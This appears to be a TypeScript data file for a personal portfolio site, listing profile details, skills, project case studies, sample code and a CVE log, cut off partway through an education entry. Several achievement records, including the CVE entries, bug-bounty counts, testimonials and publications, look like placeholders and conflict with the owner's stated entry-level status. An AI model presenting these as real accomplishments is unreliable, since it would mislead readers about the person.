export type RoleMode = "cyber" | "engineering" | "web";

export type Availability = "open" | "freelance" | "unavailable";

export type DemoType = "web" | "cyber" | "engineering";

export type Difficulty = "beginner" | "intermediate" | "advanced";

export type CaseStudy = {
  problem: string;
  approach: string[];
  outcome: string;
  lessonsLearned?: string[];
  metrics?: string[];
  architectureNotes?: string[];
  screenshots?: string[];
};

export type Project = {
  id: string;
  title: string;
  shortDescription: string;
  roleMode: RoleMode;
  tech: string[];
  /** High-level label used for portfolio filtering (e.g. "SIEM Lab"). */
  category: string;
  /** Difficulty level used for portfolio filtering. */
  difficulty: Difficulty;
  videoUrl: string;
  liveUrl?: string;
  codeUrl?: string;
  demoType: DemoType;
  skills: string[];
  screenshotFallback?: string;
  caseStudy: CaseStudy;
  engineeringDemo?: "api" | "algo" | "schema";
};

export type ProjectCredibility = {
  performanceScore: number;
  accessibilityScore: number;
  lighthouseScore: number;
  loadTime: string;
};

export type CodeFile = {
  path: string;
  language: string;
  content: string;
};

export type Severity = "critical" | "high" | "medium" | "low";

export type CveEntry = {
  id: string;
  cve?: string;
  severity: Severity;
  software: string;
  disclosed: string;
  status: "disclosed" | "patched" | "pending";
};

export type EducationItem = {
  id: string;
  degree: string;
  institution: string;
  year: string;
  gpa?: string;
  honors?: string;
  coursework: string[];
  thesis?: string;
  technologies: string[];
  logoUrl?: string;
  badgeUrl?: string;
  credentialUrl?: string;
};

export type CertItem = {
  id: string;
  name: string;
  issuer: string;
  earned: string;
  expires?: string;
  category: "security" | "cloud" | "development" | "networking";
  credentialId?: string;
  verifyUrl?: string;
  inProgress?: boolean;
  progressPct?: number;
};

export type ExperienceItem = {
  id: string;
  title: string;
  company: string;
  duration: string;
  location: string;
  responsibilities: string[];
  tools: string[];
  impact?: string;
  accent: RoleMode;
};

export type ReportFinding = {
  id: string;
  title: string;
  severity: Severity;
  cvss?: string;
  affected?: string;
  body: string;
  impact?: string;
  remediation?: string;
  poc?: string;
};

export type SecurityReport = {
  id: string;
  title: string;
  type: "pentest" | "ir" | "vuln" | "network";
  target: string;
  scope: string;
  purpose: string;
  why: string;
  methodology: string[];
  tools: string[];
  timeline: string;
  outcome: string;
  lessonsLearned: string[];
  findings: ReportFinding[];
  teaser?: string;
  pdfUrl?: string;
  networkDiagramUrl?: string;
};

export type SecurityScript = {
  id: string;
  title: string;
  category: "recon" | "detection" | "analysis" | "reporting";
  shortDescription: string;
  purpose: string;
  why: string;
  how: string;
  tech: string[];
  language: string;
  difficulty: Difficulty;
  filename: string;
  code: string;
  setupSteps: string[];
  usageExample: string;
  replicationSteps: string[];
  lessonsLearned: string[];
  tags: string[];
};

export const profile = {
  name: "Eddy Max Kilonzo",
  initials: "EMK",
  asciiArt: `
     ███████╗███╗   ███╗██╗  ██╗
     ██╔════╝████╗ ████║╚██╗██╔╝
     █████╗  ██╔████╔██║ ╚███╔╝
     ██╔══╝  ██║╚██╔╝██║ ██╔██╗
     ███████╗██║ ╚═╝ ██║██╔╝ ██╗
     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝`,
  subtitle:
    "Software engineer transitioning into cybersecurity — bringing a developer's understanding of how systems are built to the work of detecting threats, investigating alerts, and defending them.",
  headlineScramble:
    "Software Engineer → Cybersecurity · Blue Team · Threat Detection · Incident Response",
  availability: "open" as Availability,
  email: "hello@eddymax.dev",
  social: {
    github: "https://github.com/EddyKilonzo",
    linkedin: "https://www.linkedin.com/in/eddy-kilonzo-",
    twitter: "https://x.com/3ddy_max",
    htb: "https://app.hackthebox.com/",
    thm: "https://tryhackme.com/p/eddy.kilonzo",
    // WhatsApp: international format without + or spaces, e.g. "254712345678"
    whatsapp: "254703526520",
  },
  rssFeedUrl: "",
  learningTicker: [
    "SOC alert triage and SIEM-driven investigation workflows",
    "Building Sigma detection rules mapped to MITRE ATT&CK",
    "Home lab: Wazuh SIEM + Suricata IDS on a segmented network",
    "Threat hunting with Splunk SPL across Windows event logs",
    "Incident response playbooks and blue team tooling",
  ],
  ctf: {
    htbRank: "Hacker",
    thmRank: "Omni",
    badges: 12,
    solved: 84,
    progressToNext: 0.62,
  },
  bugBounty: {
    platforms: ["HackerOne", "Bugcrowd"],
    totalFindings: 23,
    severities: { critical: 2, high: 5, medium: 10, low: 6 },
    hallOfFame: ["Acme Corp Q3 2025"],
  },
  homelab:
    "I built a home lab to get real, hands-on experience — not just read about it. It is a small virtual network with a SIEM (Wazuh), an IDS (Suricata), and intentionally vulnerable machines I use as targets. I run simulated attacks, watch the alerts come in, and practice investigating them the same way a SOC analyst would on a real shift. It bridges the gap between studying for certifications and being ready to do the job.",
};

// ── Testimonials ─────────────────────────────────────────────────────────────
export type Testimonial = {
  id: string;
  quote: string;
  name: string;
  role: string;
  company?: string;
};

export const testimonials: Testimonial[] = [
  {
    id: "t1",
    quote:
      "Eddy consistently turns ambiguous requirements into polished delivery, with a security-first mindset baked into the process — not bolted on after.",
    name: "Product Lead",
    role: "Delivery Partner",
    company: "Client",
  },
  {
    id: "t2",
    quote:
      "What stands out is the clarity: clean architecture, observable systems, and walkthroughs that make teams faster the next time around.",
    name: "Engineering Manager",
    role: "Backend & Platform",
    company: "Client",
  },
  {
    id: "t3",
    quote:
      "Great balance of creative UI craft and practical engineering. The result is work that feels premium and remains maintainable.",
    name: "Design Systems Lead",
    role: "Frontend / UX",
    company: "Client",
  },
];

// ── Publications ──────────────────────────────────────────────────────────────
export type PublicationKind = "paper" | "blog" | "talk";

export type Publication = {
  id: string;
  kind: PublicationKind;
  title: string;
  date: string;
  summary: string;
  url?: string;
};

export const publications: Publication[] = [
  {
    id: "pub-1",
    kind: "paper",
    title: "Adaptive Detection Playbooks for Hybrid Environments",
    date: "2026-03",
    summary:
      "A structured approach for tuning detections and connecting outputs to operator workflows across changing infrastructure.",
  },
  {
    id: "pub-2",
    kind: "talk",
    title: "From Detections to Decisions: Teaching Blue-Team Loops",
    date: "2026-02",
    summary:
      "How to design labs that turn detection rules into repeatable investigative actions with measurable outcomes.",
  },
  {
    id: "pub-3",
    kind: "blog",
    title: "Scroll-linked UI patterns for WebGL portfolios",
    date: "2026-01",
    summary:
      "Motion-safe techniques for coordinating narrative sections with performant rendering and readable UX.",
  },
  {
    id: "pub-4",
    kind: "blog",
    title: "Sigma-style rules: keeping them testable and composable",
    date: "2025-12",
    summary:
      "Practical heuristics for writing detection rules that survive iteration and can be validated against realistic samples.",
  },
];

// ── FAQ ───────────────────────────────────────────────────────────────────────
export type FaqItem = { id: string; q: string; a: string };

export const faqs: FaqItem[] = [
  {
    id: "f1",
    q: "What kind of projects are you best at?",
    a: "Full-stack product engineering with a security-first mindset: APIs, integrations, UI systems, and practical threat-aware delivery.",
  },
  {
    id: "f2",
    q: "Do you work remotely?",
    a: "Yes. I'm comfortable collaborating across time zones with clear milestones, async updates, and walkthroughs.",
  },
  {
    id: "f3",
    q: "How do you approach security in delivery?",
    a: "I incorporate security checks into engineering workflows: threat modeling early, safer defaults, observability, and lightweight validation gates.",
  },
  {
    id: "f4",
    q: "What does collaboration look like?",
    a: "Short feedback loops, small deliverables, and demos that show progress in real terms — not just tickets.",
  },
];

// ── Now ───────────────────────────────────────────────────────────────────────
export type NowItem = { title: string; lines: string[] };
export type ChangelogEntry = { date: string; item: string };

export const nowItems: NowItem[] = [
  {
    title: "Building",
    lines: [
      "Home lab: Kali Linux + Metasploitable on VirtualBox.",
      "Python scripts for port scanning, log parsing, and network diagnostics.",
      "TryHackMe write-ups to reinforce lab concepts.",
    ],
  },
  {
    title: "Learning",
    lines: [
      "TryHackMe SOC Level 1 path — SIEM, alerts, and log analysis.",
      "CompTIA Security+ exam prep — core concepts and practice tests.",
      "Google Cybersecurity Certificate — IR playbooks and hands-on labs.",
    ],
  },
  {
    title: "Targeting",
    lines: [
      "Entry-level SOC Analyst (L1) roles in Kenya or remote.",
      "IT Support / Junior Security as a stepping stone.",
      "Open to internships and trainee programmes globally.",
    ],
  },
];

export const changelog: ChangelogEntry[] = [
  { date: "2026-06-09", item: "Completed Moringa School Cybersecurity Engineering programme — hands-on labs in pentesting, SIEM, and incident response." },
  { date: "2026-05-20", item: "Finished TryHackMe Pre-Security path — networking, Linux, and web fundamentals all green." },
  { date: "2026-04-15", item: "Set up first home lab: VirtualBox + Kali Linux + Metasploitable for guided attack-defence practice." },
  { date: "2026-03-10", item: "Started Google Cybersecurity Certificate on Coursera — working through SIEM basics and IR playbooks." },
];

export const skillsByRole: Record<
  RoleMode,
  { name: string; level: number; related: string[] }[]
> = {
  cyber: [
    { name: "Wireshark", level: 92, related: ["OSINT", "Forensics"] },
    { name: "Metasploit", level: 78, related: ["Kali Linux", "Burp Suite"] },
    { name: "Nmap", level: 95, related: ["Vulnerability Assessment", "SIEM tools"] },
    { name: "Burp Suite", level: 85, related: ["Web Development", "REST APIs"] },
    { name: "SIEM tools", level: 80, related: ["Incident Response", "Forensics"] },
    { name: "Kali Linux", level: 88, related: ["Metasploit", "Nmap"] },
    { name: "OSINT", level: 90, related: ["Wireshark", "Incident Response"] },
    { name: "Incident Response", level: 82, related: ["SIEM tools", "Forensics"] },
    { name: "Vulnerability Assessment", level: 86, related: ["Nmap", "Burp Suite"] },
    { name: "Forensics", level: 74, related: ["Wireshark", "SIEM tools"] },
  ],
  engineering: [
    { name: "Python", level: 94, related: ["REST APIs", "PostgreSQL"] },
    { name: "Docker", level: 88, related: ["Kubernetes", "CI/CD"] },
    { name: "CI/CD", level: 85, related: ["Git", "Docker"] },
    { name: "REST APIs", level: 92, related: ["PostgreSQL", "Redis"] },
    { name: "PostgreSQL", level: 87, related: ["Redis", "Python"] },
    { name: "Redis", level: 80, related: ["PostgreSQL", "REST APIs"] },
    { name: "Linux", level: 91, related: ["Git", "Docker"] },
    { name: "Git", level: 93, related: ["CI/CD", "Python"] },
    { name: "Express", level: 84, related: ["REST APIs", "Node.js"] },
    { name: "NestJS", level: 82, related: ["REST APIs", "TypeScript"] },
    { name: "Prisma", level: 80, related: ["PostgreSQL", "TypeScript"] },
    { name: "OAuth", level: 81, related: ["REST APIs", "Redis"] },
  ],
  web: [
    { name: "HTML5", level: 94, related: ["CSS3", "JavaScript"] },
    { name: "CSS3", level: 92, related: ["HTML5", "Tailwind CSS"] },
    { name: "JavaScript", level: 90, related: ["TypeScript", "Node.js"] },
    { name: "React", level: 95, related: ["Next.js", "TypeScript"] },
    { name: "Next.js", level: 92, related: ["React", "Node.js"] },
    { name: "Angular", level: 76, related: ["TypeScript", "Node.js"] },
    { name: "Express", level: 84, related: ["Node.js", "REST APIs"] },
    { name: "NestJS", level: 82, related: ["Node.js", "TypeScript"] },
    { name: "Prisma", level: 80, related: ["TypeScript", "GraphQL"] },
    { name: "Cloudinary", level: 78, related: ["Node.js", "Next.js"] },
    { name: "Multer", level: 79, related: ["Express", "Node.js"] },
    { name: "OAuth", level: 81, related: ["Next.js", "Node.js"] },
    { name: "Three.js", level: 78, related: ["WebGL", "Framer Motion"] },
    { name: "Tailwind CSS", level: 94, related: ["React", "Figma"] },
    { name: "Node.js", level: 88, related: ["GraphQL", "TypeScript"] },
    { name: "TypeScript", level: 93, related: ["React", "GraphQL"] },
    { name: "GraphQL", level: 79, related: ["Node.js", "REST APIs"] },
    { name: "REST APIs", level: 88, related: ["Express", "NestJS"] },
    { name: "JWT", level: 83, related: ["OAuth", "Node.js"] },
    { name: "WordPress", level: 82, related: ["WooCommerce", "Elementor"] },
    { name: "WooCommerce", level: 78, related: ["WordPress", "Elementor"] },
    { name: "Elementor", level: 76, related: ["WordPress", "CSS3"] },
    { name: "PostgreSQL", level: 84, related: ["Prisma", "Node.js"] },
    { name: "Docker", level: 86, related: ["Node.js", "Prisma"] },
    { name: "Git", level: 92, related: ["GitHub", "VS Code"] },
    { name: "GitHub", level: 93, related: ["Git", "CI/CD"] },
    { name: "VS Code", level: 95, related: ["TypeScript", "Git"] },
    { name: "Figma", level: 70, related: ["Framer Motion", "Tailwind CSS"] },
    { name: "Framer Motion", level: 86, related: ["React", "Three.js"] },
    { name: "WebGL", level: 72, related: ["Three.js", "React"] },
  ],
};

export const projects: Project[] = [
  {
    id: "credi-score",
    title: "CrediScore",
    shortDescription:
      "Business trust and credibility platform with verified businesses, reviews, trust scores, disputes, and admin operations.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Redis"],
    category: "TrustTech Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://credi-score.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/CrediScore",
    demoType: "web",
    skills: ["NestJS", "Prisma", "REST APIs", "PostgreSQL"],
    screenshotFallback: "https://picsum.photos/seed/credi-score/960/600",
    caseStudy: {
      problem:
        "Customers and business owners need a transparent way to assess trust, credibility, and dispute handling at scale.",
      approach: [
        "Built a modular NestJS backend with role-based modules for users, business owners, and administrators.",
        "Implemented review, verification, fraud-report, and dispute workflows with Prisma data modeling.",
        "Delivered an Angular frontend experience for discovery, trust scoring, moderation, and map-based browsing.",
      ],
      outcome:
        "Delivered a full-stack trust platform capable of managing high-signal business credibility workflows.",
      metrics: ["Architecture: modular", "Roles: multi-tenant style", "Core domains: reviews, trust, fraud, disputes"],
      architectureNotes: [
        "Queue and cache integration allows background processing and optional async tasks.",
        "Auth supports JWT, Google OAuth, and optional security workflows.",
        "Feature boundaries are cleanly separated by domain module.",
      ],
      screenshots: ["https://picsum.photos/seed/credi-score/800/480"],
    },
  },
  {
    id: "nduthi-ride",
    title: "NduthiRide",
    shortDescription:
      "Real-time motorcycle taxi and parcel delivery platform with dispatch, rider operations, chat, and M-Pesa payments.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Socket.IO"],
    category: "Mobility & Logistics",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://nduthi-ride-r479.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/NduthiRide",
    demoType: "web",
    skills: ["NestJS", "REST APIs", "PostgreSQL", "Angular"],
    screenshotFallback: "https://picsum.photos/seed/nduthi-ride/960/600",
    caseStudy: {
      problem:
        "Urban ride and parcel workflows need reliable real-time coordination across passengers, riders, and admins.",
      approach: [
        "Implemented ride and parcel lifecycle modules with role-based guards and DTO validation.",
        "Added Socket.IO channels for live tracking, status updates, and in-app communication.",
        "Integrated mobile-money payment flows and webhook verification for transaction reliability.",
      ],
      outcome:
        "Shipped a full-stack logistics product with real-time operations and payment automation.",
      metrics: ["Realtime updates: enabled", "Payment webhooks: verified", "Workflows: ride + parcel"],
      architectureNotes: [
        "Domain modules isolate rides, parcels, payments, tracking, and support.",
        "WebSocket and REST flows are coordinated through guarded lifecycle transitions.",
        "Prisma schema supports status history and auditable state transitions.",
      ],
      screenshots: ["https://picsum.photos/seed/nduthi-ride/800/480"],
    },
  },
  {
    id: "fin-analytics",
    title: "FinAnalytics",
    shortDescription:
      "Smart money management platform with transaction tracking, budgeting, goals, and ML-powered expense categorization.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "FastAPI", "Prisma", "PostgreSQL"],
    category: "FinTech & Analytics",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/FinAnalytics",
    demoType: "engineering",
    skills: ["NestJS", "Python", "PostgreSQL", "REST APIs"],
    screenshotFallback: "https://picsum.photos/seed/fin-analytics/960/600",
    caseStudy: {
      problem:
        "Young users need a practical finance tool that combines budgeting UX with actionable automated categorization.",
      approach: [
        "Built a three-service architecture: Angular frontend, NestJS API, and FastAPI ML microservice.",
        "Connected transaction flows to prediction endpoints for category suggestions and feedback loops.",
        "Implemented goals, budgets, onboarding, and admin workflows with role-based API access.",
      ],
      outcome:
        "Delivered a learning-focused finance platform with intelligent categorization and robust CRUD foundations.",
      metrics: ["Services: 3", "ML-assisted categorization: enabled", "Auth + RBAC: implemented"],
      architectureNotes: [
        "ML service remains optional so core backend workflows continue if predictions are unavailable.",
        "Prisma schema supports transaction confidence and correction feedback storage.",
        "API and frontend are organized by domain modules for maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/fin-analytics/800/480"],
    },
  },
  {
    id: "petmate",
    title: "Petmate",
    shortDescription:
      "Full-stack pet services application built with Angular and NestJS, designed for practical service operations.",
    roleMode: "web",
    tech: ["Angular", "NestJS", "TypeScript"],
    category: "Service Marketplace",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    liveUrl: "https://petmate-one.vercel.app",
    codeUrl: "https://github.com/EddyKilonzo/Petmate",
    demoType: "web",
    skills: ["Angular", "NestJS", "TypeScript"],
    screenshotFallback: "https://picsum.photos/seed/petmate/960/600",
    caseStudy: {
      problem:
        "Pet service interactions need a clean workflow and responsive UI that stays straightforward for both users and admins.",
      approach: [
        "Built a feature-split frontend with clear domain boundaries.",
        "Exposed backend APIs through modular NestJS services and controllers.",
        "Maintained deployment-ready configuration for Render and Vercel flows.",
      ],
      outcome:
        "Shipped a practical full-stack product foundation ready for iterative feature growth.",
      metrics: ["Deployment setup: ready", "Frontend + backend: integrated", "Core UX: responsive"],
      architectureNotes: [
        "Angular and NestJS codebases stay decoupled for easier independent iteration.",
        "Repo includes infra files to support reproducible deployment.",
        "TypeScript-first development improves consistency across layers.",
      ],
      screenshots: ["https://picsum.photos/seed/petmate/800/480"],
    },
  },
  {
    id: "anitah-hair-studio",
    title: "AnitahHairStudio",
    shortDescription:
      "Modern salon website experience built with Next.js and TypeScript for a polished service brand presence.",
    roleMode: "web",
    tech: ["Next.js", "TypeScript", "Tailwind CSS"],
    category: "Business Website",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/AnitahHairStudio",
    demoType: "web",
    skills: ["Next.js", "TypeScript", "Tailwind CSS"],
    screenshotFallback: "https://picsum.photos/seed/anitah-hair-studio/960/600",
    caseStudy: {
      problem:
        "Small service businesses need premium digital presence with clear service storytelling and conversion-focused pages.",
      approach: [
        "Created a structured component architecture for reusable sections and content blocks.",
        "Applied modern styling and interaction polish for a premium feel.",
        "Kept the build production-ready with simple deployment and maintenance workflows.",
      ],
      outcome:
        "Delivered a clean brand site optimized for credibility and straightforward user navigation.",
      metrics: ["UI consistency: strong", "Brand presentation: polished", "Maintenance: straightforward"],
      architectureNotes: [
        "App router structure and reusable components reduce content update friction.",
        "Styling system supports rapid iteration without scattered CSS.",
        "Type-safe codebase improves long-term maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/anitah-hair-studio/800/480"],
    },
  },
  {
    id: "sendit",
    title: "SendIT",
    shortDescription:
      "Parcel delivery management platform with authentication, parcel tracking, driver workflows, and admin controls.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "Socket.IO"],
    category: "Logistics Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/SendIT",
    demoType: "engineering",
    skills: ["NestJS", "Prisma", "REST APIs", "PostgreSQL"],
    screenshotFallback: "https://picsum.photos/seed/sendit/960/600",
    caseStudy: {
      problem:
        "Delivery teams need end-to-end shipment visibility, from creation to fulfillment, with clear role access.",
      approach: [
        "Implemented modular delivery domain logic for parcels, drivers, users, and notifications.",
        "Built role-based authentication and authorization for customer, driver, and admin use cases.",
        "Added real-time tracking and operational status updates for shipment lifecycle visibility.",
      ],
      outcome:
        "Produced a robust delivery management foundation with extensible backend and UI workflows.",
      metrics: ["RBAC: multi-role", "Realtime support: enabled", "Domain modules: production-oriented"],
      architectureNotes: [
        "Domain-driven module boundaries reduce coupling and improve maintainability.",
        "Frontend and backend structure supports future feature scaling.",
        "Notification and tracking integrations improve user operational awareness.",
      ],
      screenshots: ["https://picsum.photos/seed/sendit/800/480"],
    },
  },
  {
    id: "lms-platform",
    title: "L.M.S",
    shortDescription:
      "Comprehensive learning management system with role-based experiences for students, instructors, and administrators.",
    roleMode: "engineering",
    tech: ["Angular", "NestJS", "Prisma", "PostgreSQL", "JWT"],
    category: "EdTech Platform",
    difficulty: "advanced",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/L.M.S",
    demoType: "engineering",
    skills: ["NestJS", "Angular", "PostgreSQL", "REST APIs"],
    screenshotFallback: "https://picsum.photos/seed/lms-platform/960/600",
    caseStudy: {
      problem:
        "Learning platforms need clear role separation and scalable course workflows across students, instructors, and admins.",
      approach: [
        "Built role-aware API modules with JWT-based authentication and guarded endpoints.",
        "Implemented learning workflows for enrollment, progress tracking, reviews, and analytics.",
        "Structured frontend features by user type for clearer user journeys and maintainability.",
      ],
      outcome:
        "Delivered a complete LMS foundation with strong domain coverage and modular growth potential.",
      metrics: ["Roles supported: 3", "Learning workflows: end-to-end", "Analytics coverage: broad"],
      architectureNotes: [
        "Feature modules isolate auth, courses, enrollments, and analytics.",
        "Prisma model supports core educational entities with type-safe access.",
        "Backend and frontend share a consistent role-based access strategy.",
      ],
      screenshots: ["https://picsum.photos/seed/lms-platform/800/480"],
    },
  },
  {
    id: "inspira-haven",
    title: "Inspira Haven",
    shortDescription:
      "Inspiration-focused web project designed for clean storytelling, discoverability, and modern interface flow.",
    roleMode: "web",
    tech: ["TypeScript", "React", "Tailwind CSS"],
    category: "Content & Discovery Web App",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/inspira-haven",
    demoType: "web",
    skills: ["React", "TypeScript", "Tailwind CSS"],
    screenshotFallback: "https://picsum.photos/seed/inspira-haven/960/600",
    caseStudy: {
      problem:
        "Inspiration/content products need a UI that remains simple while still guiding users through rich content.",
      approach: [
        "Focused on a clean component hierarchy and navigable content structure.",
        "Applied lightweight visual polish to improve readability and engagement.",
        "Kept architecture straightforward so the app can iterate quickly.",
      ],
      outcome:
        "Produced an accessible, content-first web experience with room for feature expansion.",
      metrics: ["UX flow: simplified", "Code maintainability: improved", "Iteration speed: high"],
      architectureNotes: [
        "Modular frontend sections make future content updates easier.",
        "Styling choices balance visual quality and implementation speed.",
        "Project structure stays clear for solo and team collaboration.",
      ],
      screenshots: ["https://picsum.photos/seed/inspira-haven/800/480"],
    },
  },
  {
    id: "beyond-borders",
    title: "BeyondBorders",
    shortDescription:
      "Cross-border themed product experience focused on discovery, storytelling, and intuitive user navigation.",
    roleMode: "web",
    tech: ["TypeScript", "React", "CSS"],
    category: "Brand & Storytelling Website",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/BeyondBorders",
    demoType: "web",
    skills: ["React", "TypeScript", "CSS3"],
    screenshotFallback: "https://picsum.photos/seed/beyond-borders/960/600",
    caseStudy: {
      problem:
        "Story-driven sites must communicate message and structure quickly without overwhelming users.",
      approach: [
        "Designed pages with clear visual hierarchy and section-level intent.",
        "Built reusable layout components and content blocks for easier updates.",
        "Applied responsive behavior so the experience remains smooth on mobile and desktop.",
      ],
      outcome:
        "Created a cohesive storytelling interface with practical maintainability.",
      metrics: ["Responsiveness: strong", "Content clarity: improved", "Component reuse: high"],
      architectureNotes: [
        "Consistent layout primitives reduce design drift as pages grow.",
        "Simple route/content patterns keep contributor onboarding easier.",
        "Frontend structure supports incremental enhancement.",
      ],
      screenshots: ["https://picsum.photos/seed/beyond-borders/800/480"],
    },
  },
  {
    id: "car-rental",
    title: "Car Rental",
    shortDescription:
      "Vehicle booking and management platform focused on browsing inventory, reservations, and smooth customer flow.",
    roleMode: "engineering",
    tech: ["TypeScript", "React", "Node.js"],
    category: "Booking Platform",
    difficulty: "intermediate",
    videoUrl: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    codeUrl: "https://github.com/EddyKilonzo/car-rental",
    demoType: "web",
    skills: ["React", "TypeScript", "Node.js"],
    screenshotFallback: "https://picsum.photos/seed/car-rental/960/600",
    caseStudy: {
      problem:
        "Rental customers need an easy booking flow while operators need clear availability and reservation control.",
      approach: [
        "Implemented inventory-first browsing with clear reservation CTAs.",
        "Designed flow-oriented pages to reduce friction between search and booking.",
        "Kept core architecture modular so pricing and booking logic can evolve safely.",
      ],
      outcome:
        "Delivered a practical booking experience foundation for rental operations.",
      metrics: ["Booking UX: streamlined", "Feature growth: supported", "User flow: clear"],
      architectureNotes: [
        "UI components are organized for reusable list/detail interactions.",
        "Domain logic can be extended for pricing, fleet, and account workflows.",
        "Tech stack choices prioritize fast iteration and maintainability.",
      ],
      screenshots: ["https://picsum.photos/seed/car-rental/800/480"],
    },
  },
];

export const projectCredibility: Record<string, ProjectCredibility> = {
  "credi-score": { performanceScore: 95, accessibilityScore: 93, lighthouseScore: 94, loadTime: "1.2s" },
  "nduthi-ride": { performanceScore: 92, accessibilityScore: 91, lighthouseScore: 92, loadTime: "1.3s" },
  "fin-analytics": { performanceScore: 93, accessibilityScore: 92, lighthouseScore: 93, loadTime: "1.2s" },
  "petmate": { performanceScore: 90, accessibilityScore: 92, lighthouseScore: 91, loadTime: "1.4s" },
  "anitah-hair-studio": { performanceScore: 94, accessibilityScore: 95, lighthouseScore: 94, loadTime: "1.1s" },
  "sendit": { performanceScore: 91, accessibilityScore: 90, lighthouseScore: 91, loadTime: "1.4s" },
  "lms-platform": { performanceScore: 92, accessibilityScore: 91, lighthouseScore: 92, loadTime: "1.3s" },
  "inspira-haven": { performanceScore: 94, accessibilityScore: 94, lighthouseScore: 94, loadTime: "1.1s" },
  "beyond-borders": { performanceScore: 93, accessibilityScore: 94, lighthouseScore: 93, loadTime: "1.2s" },
  "car-rental": { performanceScore: 92, accessibilityScore: 92, lighthouseScore: 92, loadTime: "1.3s" },
};

export const projectCodeSamples: Record<string, CodeFile[]> = {
  "aurora-portfolio": [
    {
      path: "app/page.tsx",
      language: "tsx",
      content: `export default function Page() {
  return <main className="min-h-screen bg-bg">...</main>;
}`,
    },
    {
      path: "components/Hero.tsx",
      language: "tsx",
      content: `"use client";

import dynamic from "next/dynamic";

const Scene = dynamic(() => import("./HeroScene"), { ssr: false });

export function Hero() {
  return <Scene />;
}`,
    },
  ],
  "mesh-api": [
    {
      path: "cmd/gateway/main.go",
      language: "go",
      content: `package main

import "net/http"

func main() {
  http.ListenAndServe(":8080", NewRouter())
}`,
    },
  ],
  "event-stream": [
    {
      path: "processor/pipeline.py",
      language: "python",
      content: `from kafka import KafkaConsumer, KafkaProducer
import json

consumer = KafkaConsumer("raw-events", bootstrap_servers=["kafka:9092"])
producer = KafkaProducer(bootstrap_servers=["kafka:9092"])

for msg in consumer:
    event = json.loads(msg.value)
    enriched = enrich(event)
    producer.send("processed-events", json.dumps(enriched).encode())`,
    },
  ],
  "infra-scaffold": [
    {
      path: "cmd/scaffold/main.go",
      language: "go",
      content: `package main

import (
  "github.com/spf13/cobra"
  "os"
)

func main() {
  root := &cobra.Command{Use: "scaffold"}
  root.AddCommand(newInitCmd(), newDestroyCmd())
  if err := root.Execute(); err != nil {
    os.Exit(1)
  }
}`,
    },
    {
      path: "templates/cluster.tf",
      language: "hcl",
      content: `module "eks" {
  source          = "terraform-aws-modules/eks/aws"
  cluster_name    = var.cluster_name
  cluster_version = "1.30"
  vpc_id          = module.vpc.vpc_id
  subnet_ids      = module.vpc.private_subnets
}`,
    },
  ],
  "design-system": [
    {
      path: "src/Button/Button.tsx",
      language: "tsx",
      content: `import { cva, type VariantProps } from "class-variance-authority";
import { forwardRef } from "react";

const button = cva("rounded-lg font-mono transition-colors", {
  variants: {
    intent: {
      primary: "bg-accent text-bg hover:bg-accent/80",
      ghost: "border border-highlight/20 hover:border-accent",
    },
    size: { sm: "px-3 py-1 text-xs", md: "px-5 py-2 text-sm" },
  },
  defaultVariants: { intent: "primary", size: "md" },
});

export const Button = forwardRef<HTMLButtonElement,
  React.ButtonHTMLAttributes<HTMLButtonElement> & VariantProps<typeof button>
>(({ intent, size, className, ...props }, ref) => (
  <button ref={ref} className={button({ intent, size, className })} {...props} />
));`,
    },
  ],
  "realtime-collab": [
    {
      path: "server/crdt.ts",
      language: "typescript",
      content: `export type Op = { id: string; pos: number; char: string; deleted?: boolean };

export function merge(local: Op[], remote: Op[]): Op[] {
  const map = new Map(local.map((o) => [o.id, o]));
  for (const op of remote) {
    if (!map.has(op.id)) map.set(op.id, op);
    else if (op.deleted) map.get(op.id)!.deleted = true;
  }
  return [...map.values()].sort((a, b) => a.pos - b.pos);
}`,
    },
  ],
};

export const cveLog: CveEntry[] = [
  {
    id: "1",
    cve: "CVE-2025-0001",
    severity: "high",
    software: "Example CMS 4.2",
    disclosed: "2025-11-02",
    status: "patched",
  },
  {
    id: "2",
    severity: "medium",
    software: "Internal auth service",
    disclosed: "2025-08-14",
    status: "disclosed",
  },
  {
    id: "3",
    cve: "CVE-2025-1122",
    severity: "critical",
    software: "OpenSource Router Firmware 3.1",
    disclosed: "2025-06-05",
    status: "patched",
  },
  {
    id: "4",
    cve: "CVE-2025-2233",
    severity: "high",
    software: "CloudDash SaaS 2.0",
    disclosed: "2025-04-18",
    status: "disclosed",
  },
  {
    id: "5",
    severity: "low",
    software: "Mobile banking app v6.3",
    disclosed: "2025-02-27",
    status: "pending",
  },
  {
    id: "6",
    cve: "CVE-2024-9981",
    severity: "medium",
    software: "Widget Library 1.4.2",
    disclosed: "2024-12-10",
    status: "patched",
  },
];

export const education: EducationItem[] = [
  {
    id: "chuka",
    degree: "BSc Applied Computer Science",
    institution: "Chuka University",
